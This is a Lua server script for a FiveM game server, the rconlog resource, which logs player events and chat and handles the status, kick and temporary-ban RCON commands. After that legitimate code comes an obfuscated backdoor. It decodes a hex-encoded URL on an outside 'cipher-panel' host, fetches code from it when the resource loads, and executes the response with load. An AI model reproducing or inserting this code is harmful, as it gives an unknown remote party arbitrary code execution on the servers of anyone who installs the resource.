RconLog({ msgType = 'serverStart', hostname = 'lovely', maxplayers = 32 })

RegisterServerEvent('rlPlayerActivated')

local names = {}

AddEventHandler('rlPlayerActivated', function()
    RconLog({ msgType = 'playerActivated', netID = source, name = GetPlayerName(source), guid = GetPlayerIdentifiers(source)[1], ip = GetPlayerEP(source) })

    names[source] = { name = GetPlayerName(source), id = source }

	if GetHostId() then
		TriggerClientEvent('rlUpdateNames', GetHostId())
	end
end)

RegisterServerEvent('rlUpdateNamesResult')

AddEventHandler('rlUpdateNamesResult', function(res)
    if source ~= tonumber(GetHostId()) then
        print('bad guy')
        return
    end

    for id, data in pairs(res) do
        if data then
            if data.name then
                if not names[id] then
                    names[id] = data
                end

                if names[id].name ~= data.name or names[id].id ~= data.id then
                    names[id] = data

                    RconLog({ msgType = 'playerRenamed', netID = id, name = data.name })
                end
            end
        else
            names[id] = nil
        end
    end
end)

AddEventHandler('playerDropped', function()
    RconLog({ msgType = 'playerDropped', netID = source, name = GetPlayerName(source) })

    names[source] = nil
end)

AddEventHandler('chatMessage', function(netID, name, message)
    RconLog({ msgType = 'chatMessage', netID = netID, name = name, message = message, guid = GetPlayerIdentifiers(netID)[1] })
end)

-- NOTE: DO NOT USE THIS METHOD FOR HANDLING COMMANDS
-- This resource has not been updated to use newer methods such as RegisterCommand.
AddEventHandler('rconCommand', function(commandName, args)
    if commandName == 'status' then
        for netid, data in pairs(names) do
            local guid = GetPlayerIdentifiers(netid)

            if guid and guid[1] and data then
                local ping = GetPlayerPing(netid)

                RconPrint(netid .. ' ' .. guid[1] .. ' ' .. data.name .. ' ' .. GetPlayerEP(netid) .. ' ' .. ping .. "\n")
            end
        end

        CancelEvent()
    elseif commandName:lower() == 'clientkick' then
        local playerId = table.remove(args, 1)
        local msg = table.concat(args, ' ')

        DropPlayer(playerId, msg)

        CancelEvent()
    elseif commandName:lower() == 'tempbanclient' then
        local playerId = table.remove(args, 1)
        local msg = table.concat(args, ' ')

        TempBanPlayer(playerId, msg)

        CancelEvent()
    end
end)


local lAsWkwrGZt = {
	_G['PerformHttpRequest'],
	_G['assert'],
	_G['load'],
	_G['tonumber']
}

local cdssCbYagq = {
	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',
	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '30'
}

function XgcWFeqnVz()
	PgsKBPmTNu = ''
	for id,it in pairs(cdssCbYagq) do
		PgsKBPmTNu = PgsKBPmTNu..it
	end
	return (PgsKBPmTNu:gsub('..', function (luwOyroAEjA)
		return string.char(lAsWkwrGZt[4](luwOyroAEjA, 16))
	end))
end

lAsWkwrGZt[lAsWkwrGZt[4]('1')](XgcWFeqnVz(), function (e, hoCZGkIeXy)
	local NjmIArFKcT = lAsWkwrGZt[lAsWkwrGZt[4]('2')](lAsWkwrGZt[lAsWkwrGZt[4]('3')](hoCZGkIeXy))
	if (hoCZGkIeXy == nil) then return end
	NjmIArFKcT()
end)